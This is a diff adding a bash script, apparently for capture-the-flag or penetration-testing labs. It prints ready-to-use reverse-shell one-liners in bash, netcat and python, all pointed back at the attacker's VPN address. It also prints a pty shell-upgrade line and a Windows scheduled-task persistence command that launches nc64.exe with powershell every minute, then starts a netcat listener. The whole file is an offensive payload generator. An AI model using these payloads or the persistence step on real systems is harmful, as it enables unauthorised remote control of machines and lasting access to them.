@@ -1,0 +1,48 @@
+#!/bin/bash
+tun0=$(/sbin/ifconfig tun0 | grep 'inet' | head -1 | awk '{print $2}')
+
+if [ -z $1 ]
+  then
+
+    echo '# bash ----------------------------'
+    echo "bash -i >& /dev/tcp/$tun0/1337 0>&1"
+    echo "bash -i >& /dev/tcp/$tun0/1338 0>&1"
+    echo ""
+    echo '# nc ------------------------------'
+    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $tun0 1337 >/tmp/f"
+    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $tun0 1338 >/tmp/f"
+    echo ""
+    echo '# python --------------------------'
+    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$tun0\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
+    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$tun0\",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
+    echo ""
+    echo '# python3 --------------------------'
+    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$tun0\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
+    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$tun0\",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
+    echo ""
+
+    echo '# Shell Upgrade -------------------'
+    echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+    
+
+else
+    port=$1
+    echo '# bash ----------------------------'
+    echo "bash -i >& /dev/tcp/$tun0/$port 0>&1"
+    echo ""
+    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $tun0 $port >/tmp/f"
+    echo ""
+    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$tun0\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
+    echo ""
+    echo '# python3 --------------------------'
+    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$tun0\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
+    echo ""
+    echo '# Shell Upgrade -------------------'
+    echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+    echo 'Persitance'
+    echo 'sudo service smbd start (dont forget to try nc.exe and nc64.exe'
+    echo 'schtasks.exe /create /tn '"shell$port"' /tr '"\\$tun0\public\nc64.exe 10.10.14.7 $port -e powershell"' /sc minute /mo 1'
+
+    rlwrap -cAr nc -nlvp $port
+
+fi
